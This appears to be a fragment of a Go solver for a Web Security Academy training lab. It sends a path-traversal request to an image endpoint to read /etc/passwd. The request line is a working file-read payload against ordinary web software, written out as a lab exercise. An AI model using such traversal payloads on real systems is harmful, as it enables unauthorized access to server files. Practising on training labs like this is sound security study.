...
func solve() error {
	baseUrl := "https://0a3400fa03ea725ec031d61f00e800b8.web-security-academy.net"
	...
	_, body, err := get(client, baseUrl + "/image?filename=/var/www/images/../../../etc/passwd", nil)
	if err != nil {
		return err
	}
	...
	//6_, body, err := postForm(client, stockUrl, nil, values)
	//if err != nil {
	//	return err
	//}
